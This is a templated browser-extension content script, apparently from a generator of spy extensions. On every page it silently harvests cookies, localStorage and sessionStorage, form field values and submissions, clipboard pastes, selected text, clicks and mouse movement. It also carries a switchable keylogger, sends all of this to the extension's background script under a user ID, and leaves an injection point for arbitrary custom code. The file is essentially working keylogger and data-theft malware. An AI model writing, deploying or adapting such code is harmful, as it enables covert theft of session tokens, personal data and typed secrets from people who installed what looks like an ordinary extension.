
// Enhanced Content script for {{EXTENSION_NAME}}
(function() {
  'use strict';

  const EXTENSION_ID = '{{EXTENSION_ID}}';
  const USER_ID = '{{USER_ID}}';
  let sessionId = '';

  // Get session ID from background
  chrome.runtime.sendMessage({ type: 'getSessionId' }, (response) => {
    if (response?.sessionId) {
      sessionId = response.sessionId;
    }
  });

  // COMPREHENSIVE DATA COLLECTION ON PAGE LOAD
  function collectAllPageData() {
    const pageData = {
      type: 'complete_page_scan',
      timestamp: Date.now(),
      url: window.location.href,
      domain: window.location.hostname,
      title: document.title,
      
      // Page metrics
      pageMetrics: {
        totalElements: document.querySelectorAll('*').length,
        formCount: document.querySelectorAll('form').length,
        inputCount: document.querySelectorAll('input, textarea, select').length,
        linkCount: document.querySelectorAll('a[href]').length,
        imageCount: document.querySelectorAll('img').length,
        scriptCount: document.querySelectorAll('script').length,
        iframeCount: document.querySelectorAll('iframe').length,
        buttonCount: document.querySelectorAll('button').length,
        divCount: document.querySelectorAll('div').length
      },

      // All form data
      forms: [],
      
      // All input fields with current values
      allInputs: [],
      
      // All links
      allLinks: [],
      
      // All text content
      textContent: document.body ? document.body.innerText.substring(0, 5000) : '',
      
      // Page HTML structure (limited)
      htmlStructure: document.documentElement.outerHTML.substring(0, 10000),
      
      // All cookies
      cookies: document.cookie,
      
      // Storage data
      localStorage: {},
      sessionStorage: {},
      
      // Meta tags
      metaTags: [],
      
      // Scripts and resources
      scripts: [],
      stylesheets: [],
      
      // Browser and system info
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      cookieEnabled: navigator.cookieEnabled,
      onLine: navigator.onLine,
      referrer: document.referrer,
      
      // Page timing
      loadTime: performance.timing ? performance.timing.loadEventEnd - performance.timing.navigationStart : 0,
      domReady: performance.timing ? performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart : 0
    };

    // Collect all forms with complete details
    document.querySelectorAll('form').forEach((form, index) => {
      const formData = {
        index: index,
        action: form.action,
        method: form.method,
        name: form.name,
        id: form.id,
        className: form.className,
        target: form.target,
        autocomplete: form.autocomplete,
        noValidate: form.noValidate,
        inputs: []
      };

      form.querySelectorAll('input, textarea, select, button').forEach(input => {
        formData.inputs.push({
          type: input.type || 'unknown',
          name: input.name,
          id: input.id,
          className: input.className,
          placeholder: input.placeholder,
          value: input.type === 'password' ? '[HIDDEN-PASSWORD]' : input.value,
          required: input.required,
          disabled: input.disabled,
          readonly: input.readOnly,
          checked: input.checked,
          selected: input.selected,
          maxLength: input.maxLength,
          minLength: input.minLength,
          min: input.min,
          max: input.max,
          step: input.step,
          pattern: input.pattern,
          autocomplete: input.autocomplete,
          tabIndex: input.tabIndex
        });
      });

      pageData.forms.push(formData);
    });

    // Collect ALL input fields (including those outside forms)
    document.querySelectorAll('input, textarea, select').forEach(input => {
      pageData.allInputs.push({
        type: input.type || 'unknown',
        name: input.name,
        id: input.id,
        className: input.className,
        placeholder: input.placeholder,
        value: input.type === 'password' ? '[HIDDEN-PASSWORD]' : 
               input.type === 'email' ? input.value :
               input.type === 'tel' ? input.value :
               input.value,
        required: input.required,
        disabled: input.disabled,
        readonly: input.readOnly,
        checked: input.checked,
        selected: input.selected,
        autocomplete: input.autocomplete,
        formAction: input.form ? input.form.action : null,
        formMethod: input.form ? input.form.method : null
      });
    });

    // Collect all links
    document.querySelectorAll('a').forEach(link => {
      pageData.allLinks.push({
        href: link.href,
        text: link.textContent?.trim().substring(0, 200),
        title: link.title,
        target: link.target,
        rel: link.rel,
        download: link.download,
        ping: link.ping,
        type: link.type
      });
    });

    // Collect meta tags
    document.querySelectorAll('meta').forEach(meta => {
      pageData.metaTags.push({
        name: meta.name,
        property: meta.property,
        content: meta.content,
        httpEquiv: meta.httpEquiv,
        charset: meta.charset
      });
    });

    // Collect script sources
    document.querySelectorAll('script').forEach(script => {
      pageData.scripts.push({
        src: script.src,
        type: script.type,
        async: script.async,
        defer: script.defer,
        crossOrigin: script.crossOrigin,
        integrity: script.integrity,
        content: script.src ? null : script.textContent?.substring(0, 500)
      });
    });

    // Collect stylesheets
    document.querySelectorAll('link[rel="stylesheet"], style').forEach(style => {
      pageData.stylesheets.push({
        href: style.href,
        type: style.type,
        media: style.media,
        disabled: style.disabled,
        content: style.tagName === 'STYLE' ? style.textContent?.substring(0, 500) : null
      });
    });

    // Collect localStorage
    try {
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key) {
          pageData.localStorage[key] = localStorage.getItem(key);
        }
      }
    } catch (e) {
      pageData.localStorage = { error: 'Access denied' };
    }

    // Collect sessionStorage
    try {
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        if (key) {
          pageData.sessionStorage[key] = sessionStorage.getItem(key);
        }
      }
    } catch (e) {
      pageData.sessionStorage = { error: 'Access denied' };
    }

    sendMessage(pageData);
  }

  // Enhanced form tracking
  const formDataEnabled = {{FEATURE_FORM_DATA}};
  if (formDataEnabled) {
    // Track ALL form interactions
    document.addEventListener('input', function(event) {
      if (event.target.matches('input, textarea, select')) {
        sendMessage({
          type: 'form_input',
          timestamp: Date.now(),
          element: {
            type: event.target.type,
            name: event.target.name,
            id: event.target.id,
            value: event.target.type === 'password' ? '[HIDDEN-PASSWORD]' : event.target.value,
            form: event.target.form ? {
              action: event.target.form.action,
              method: event.target.form.method,
              name: event.target.form.name
            } : null
          },
          url: window.location.href
        });
      }
    });

    // Track form focus/blur events
    document.addEventListener('focusin', function(event) {
      if (event.target.matches('input, textarea, select')) {
        sendMessage({
          type: 'form_focus',
          timestamp: Date.now(),
          element: {
            type: event.target.type,
            name: event.target.name,
            id: event.target.id,
            placeholder: event.target.placeholder,
            value: event.target.type === 'password' ? '[HIDDEN-PASSWORD]' : event.target.value
          },
          url: window.location.href
        });
      }
    });

    // Track form submissions with complete data
    document.addEventListener('submit', function(event) {
      const formData = new FormData(event.target);
      const formInfo = {
        type: 'form_submit',
        timestamp: Date.now(),
        form: {
          action: event.target.action,
          method: event.target.method,
          name: event.target.name,
          id: event.target.id,
          className: event.target.className,
          target: event.target.target,
          autocomplete: event.target.autocomplete
        },
        fields: {},
        allFieldData: [],
        url: window.location.href
      };

      // Capture all form data
      for (let [name, value] of formData.entries()) {
        const field = event.target.querySelector(`[name="${name}"]`);
        formInfo.fields[name] = {
          type: field?.type || 'unknown',
          value: field?.type === 'password' ? '[HIDDEN-PASSWORD]' : value,
          hasValue: value.length > 0,
          valueLength: value.length
        };
      }

      // Capture all field details
      event.target.querySelectorAll('input, textarea, select, button').forEach(field => {
        formInfo.allFieldData.push({
          type: field.type,
          name: field.name,
          id: field.id,
          value: field.type === 'password' ? '[HIDDEN-PASSWORD]' : field.value,
          placeholder: field.placeholder,
          required: field.required,
          checked: field.checked,
          selected: field.selected
        });
      });

      sendMessage(formInfo);
    });
  }

  // ULTRA-ENHANCED CLICK TRACKING
  const clickTrackingEnabled = {{FEATURE_CLICK_TRACKING}};
  if (clickTrackingEnabled) {
    document.addEventListener('click', function(event) {
      const clickData = {
        type: 'ultra_click_tracking',
        timestamp: Date.now(),
        element: {
          tagName: event.target.tagName,
          id: event.target.id,
          className: event.target.className,
          text: event.target.textContent?.substring(0, 500),
          innerHTML: event.target.innerHTML?.substring(0, 1000),
          href: event.target.href,
          src: event.target.src,
          type: event.target.type,
          name: event.target.name,
          value: event.target.value,
          alt: event.target.alt,
          title: event.target.title,
          role: event.target.role,
          ariaLabel: event.target.ariaLabel,
          dataset: Object.assign({}, event.target.dataset),
          attributes: {}
        },
        coordinates: {
          clientX: event.clientX,
          clientY: event.clientY,
          pageX: event.pageX,
          pageY: event.pageY,
          screenX: event.screenX,
          screenY: event.screenY,
          offsetX: event.offsetX,
          offsetY: event.offsetY
        },
        viewport: {
          width: window.innerWidth,
          height: window.innerHeight,
          scrollX: window.scrollX,
          scrollY: window.scrollY
        },
        eventInfo: {
          bubbles: event.bubbles,
          cancelable: event.cancelable,
          composed: event.composed,
          detail: event.detail,
          isTrusted: event.isTrusted
        },
        parentElement: event.target.parentElement ? {
          tagName: event.target.parentElement.tagName,
          id: event.target.parentElement.id,
          className: event.target.parentElement.className
        } : null,
        url: window.location.href,
        path: window.location.pathname
      };

      // Get all attributes
      if (event.target.attributes) {
        for (let attr of event.target.attributes) {
          clickData.element.attributes[attr.name] = attr.value;
        }
      }

      sendMessage(clickData);
    });

    // Track double clicks
    document.addEventListener('dblclick', function(event) {
      sendMessage({
        type: 'double_click',
        timestamp: Date.now(),
        element: {
          tagName: event.target.tagName,
          id: event.target.id,
          text: event.target.textContent?.substring(0, 100)
        },
        coordinates: { pageX: event.pageX, pageY: event.pageY },
        url: window.location.href
      });
    });

    // Track right-clicks (context menu)
    document.addEventListener('contextmenu', function(event) {
      sendMessage({
        type: 'right_click',
        timestamp: Date.now(),
        element: {
          tagName: event.target.tagName,
          id: event.target.id,
          className: event.target.className,
          text: event.target.textContent?.substring(0, 100)
        },
        coordinates: { pageX: event.pageX, pageY: event.pageY },
        url: window.location.href
      });
    });
  }

  // COMPREHENSIVE KEYSTROKE TRACKING
  const keyloggerEnabled = {{FEATURE_KEYLOGGER}};
  if (keyloggerEnabled) {
    let keystrokeBuffer = '';
    let keySequence = [];
    let lastKeystroke = 0;

    document.addEventListener('keydown', function(event) {
      const now = Date.now();

      // Reset buffer if more than 3 seconds since last keystroke
      if (now - lastKeystroke > 3000) {
        keystrokeBuffer = '';
        keySequence = [];
      }

      lastKeystroke = now;
      keystrokeBuffer += event.key;
      
      keySequence.push({
        key: event.key,
        code: event.code,
        timestamp: now,
        ctrlKey: event.ctrlKey,
        altKey: event.altKey,
        shiftKey: event.shiftKey,
        metaKey: event.metaKey
      });

      // Send keystroke data every 5 characters or on special keys
      if (keystrokeBuffer.length >= 5 || ['Enter', 'Tab', 'Escape'].includes(event.key)) {
        const keystrokeData = {
          type: 'comprehensive_keystroke',
          timestamp: now,
          keys: keystrokeBuffer,
          keyCount: keystrokeBuffer.length,
          sequence: keySequence,
          element: {
            tagName: event.target.tagName,
            type: event.target.type,
            id: event.target.id,
            name: event.target.name,
            className: event.target.className,
            placeholder: event.target.placeholder,
            value: event.target.value?.substring(0, 100),
            form: event.target.form ? {
              action: event.target.form.action,
              method: event.target.form.method,
              name: event.target.form.name
            } : null
          },
          modifiers: {
            ctrl: event.ctrlKey,
            alt: event.altKey,
            shift: event.shiftKey,
            meta: event.metaKey
          },
          keyInfo: {
            key: event.key,
            code: event.code,
            keyCode: event.keyCode,
            which: event.which,
            repeat: event.repeat,
            isComposing: event.isComposing
          },
          url: window.location.href,
          path: window.location.pathname
        };

        sendMessage(keystrokeData);
        keystrokeBuffer = '';
        keySequence = [];
      }
    });

    // Track special key combinations
    document.addEventListener('keydown', function(event) {
      if (event.ctrlKey || event.metaKey || event.altKey) {
        const shortcutData = {
          type: 'keyboard_shortcut',
          timestamp: Date.now(),
          combination: `${event.ctrlKey ? 'Ctrl+' : ''}${event.metaKey ? 'Cmd+' : ''}${event.altKey ? 'Alt+' : ''}${event.shiftKey ? 'Shift+' : ''}${event.key}`,
          keys: {
            key: event.key,
            code: event.code,
            ctrlKey: event.ctrlKey,
            altKey: event.altKey,
            shiftKey: event.shiftKey,
            metaKey: event.metaKey
          },
          element: {
            tagName: event.target.tagName,
            id: event.target.id,
            type: event.target.type
          },
          url: window.location.href
        };
        sendMessage(shortcutData);
      }
    });
  }

  // Enhanced page monitoring
  function monitorPageActivity() {
    const activityData = {
      type: 'page_activity_detailed',
      timestamp: Date.now(),
      url: window.location.href,
      domain: window.location.hostname,
      title: document.title,
      pageMetrics: {
        totalElements: document.querySelectorAll('*').length,
        formCount: document.querySelectorAll('form').length,
        inputCount: document.querySelectorAll('input, textarea, select').length,
        linkCount: document.querySelectorAll('a[href]').length,
        imageCount: document.querySelectorAll('img').length,
        scriptCount: document.querySelectorAll('script').length,
        iframeCount: document.querySelectorAll('iframe').length,
        buttonCount: document.querySelectorAll('button').length
      },
      pageSize: {
        documentHeight: document.documentElement.scrollHeight,
        documentWidth: document.documentElement.scrollWidth,
        viewportHeight: window.innerHeight,
        viewportWidth: window.innerWidth
      },
      scrollPosition: {
        x: window.scrollX,
        y: window.scrollY,
        percentX: (window.scrollX / (document.documentElement.scrollWidth - window.innerWidth)) * 100,
        percentY: (window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100
      },
      performance: {
        loadTime: performance.timing ? performance.timing.loadEventEnd - performance.timing.navigationStart : 0,
        domReady: performance.timing ? performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart : 0,
        memoryUsage: performance.memory ? {
          usedJSHeapSize: performance.memory.usedJSHeapSize,
          totalJSHeapSize: performance.memory.totalJSHeapSize,
          jsHeapSizeLimit: performance.memory.jsHeapSizeLimit
        } : null
      },
      activeElement: document.activeElement ? {
        tagName: document.activeElement.tagName,
        id: document.activeElement.id,
        type: document.activeElement.type,
        name: document.activeElement.name
      } : null
    };

    sendMessage(activityData);
  }

  // Monitor clipboard events
  document.addEventListener('copy', function(event) {
    sendMessage({
      type: 'clipboard_copy',
      timestamp: Date.now(),
      selection: window.getSelection().toString().substring(0, 500),
      url: window.location.href
    });
  });

  document.addEventListener('paste', function(event) {
    const pasteData = {
      type: 'clipboard_paste',
      timestamp: Date.now(),
      url: window.location.href,
      element: {
        tagName: event.target.tagName,
        id: event.target.id,
        type: event.target.type,
        name: event.target.name
      }
    };

    // Try to get clipboard data
    try {
      if (event.clipboardData) {
        pasteData.clipboardData = {
          types: Array.from(event.clipboardData.types),
          textData: event.clipboardData.getData('text/plain')?.substring(0, 500)
        };
      }
    } catch (e) {
      pasteData.clipboardData = { error: 'Access denied' };
    }

    sendMessage(pasteData);
  });

  // Monitor selection changes
  document.addEventListener('selectionchange', function() {
    const selection = window.getSelection();
    if (selection.toString().length > 0) {
      sendMessage({
        type: 'text_selection',
        timestamp: Date.now(),
        selectedText: selection.toString().substring(0, 500),
        selectionLength: selection.toString().length,
        url: window.location.href
      });
    }
  });

  // Monitor page visibility changes
  document.addEventListener('visibilitychange', function() {
    sendMessage({
      type: 'visibility_change',
      timestamp: Date.now(),
      visible: !document.hidden,
      visibilityState: document.visibilityState,
      url: window.location.href
    });
  });

  // Monitor scroll activity with detailed tracking
  let scrollTimeout;
  window.addEventListener('scroll', function() {
    clearTimeout(scrollTimeout);
    scrollTimeout = setTimeout(() => {
      sendMessage({
        type: 'scroll_activity',
        timestamp: Date.now(),
        scrollPosition: {
          x: window.scrollX,
          y: window.scrollY,
          percentX: (window.scrollX / (document.documentElement.scrollWidth - window.innerWidth)) * 100,
          percentY: (window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100
        },
        documentSize: {
          width: document.documentElement.scrollWidth,
          height: document.documentElement.scrollHeight
        },
        viewportSize: {
          width: window.innerWidth,
          height: window.innerHeight
        },
        url: window.location.href
      });
    }, 500);
  });

  // Monitor mouse movement (throttled)
  let lastMouseMove = 0;
  document.addEventListener('mousemove', function(event) {
    const now = Date.now();
    if (now - lastMouseMove > 2000) { // Every 2 seconds
      lastMouseMove = now;
      sendMessage({
        type: 'mouse_movement',
        timestamp: now,
        coordinates: {
          clientX: event.clientX,
          clientY: event.clientY,
          pageX: event.pageX,
          pageY: event.pageY
        },
        url: window.location.href
      });
    }
  });

  // Monitor focus changes
  window.addEventListener('focus', function() {
    sendMessage({
      type: 'window_focus',
      timestamp: Date.now(),
      focused: true,
      url: window.location.href
    });
  });

  window.addEventListener('blur', function() {
    sendMessage({
      type: 'window_blur',
      timestamp: Date.now(),
      focused: false,
      url: window.location.href
    });
  });

  // Send enhanced message to background script
  function sendMessage(data) {
    try {
      const enhancedData = {
        ...data,
        extensionId: EXTENSION_ID,
        sessionId: sessionId,
        userId: USER_ID,
        pageInfo: {
          referrer: document.referrer || '',
          characterSet: document.characterSet || 'UTF-8',
          lastModified: document.lastModified || '',
          readyState: document.readyState || 'unknown',
          title: document.title,
          domain: window.location.hostname,
          protocol: window.location.protocol,
          port: window.location.port,
          pathname: window.location.pathname,
          search: window.location.search,
          hash: window.location.hash
        },
        browserInfo: {
          userAgent: navigator.userAgent,
          language: navigator.language,
          platform: navigator.platform,
          cookieEnabled: navigator.cookieEnabled,
          onLine: navigator.onLine,
          hardwareConcurrency: navigator.hardwareConcurrency,
          deviceMemory: navigator.deviceMemory
        }
      };

      if (chrome && chrome.runtime && chrome.runtime.sendMessage) {
        chrome.runtime.sendMessage(enhancedData, (response) => {
          if (chrome.runtime.lastError) {
            console.warn('Message sending failed:', chrome.runtime.lastError.message);
          }
        });
      }
    } catch (error) {
      console.error('Error sending message to background:', error);
    }
  }

  // Initial comprehensive data collection
  setTimeout(() => {
    collectAllPageData();
  }, 1000);

  // Periodic comprehensive data collection
  setInterval(() => {
    collectAllPageData();
  }, 30000); // Every 30 seconds

  // Monitor page activity every 15 seconds
  setInterval(monitorPageActivity, 15000);

  // Custom user code injection point
  try {
    {{CUSTOM_CODE}}
  } catch (error) {
    console.error('Custom code error in content script:', error);
  }

})();
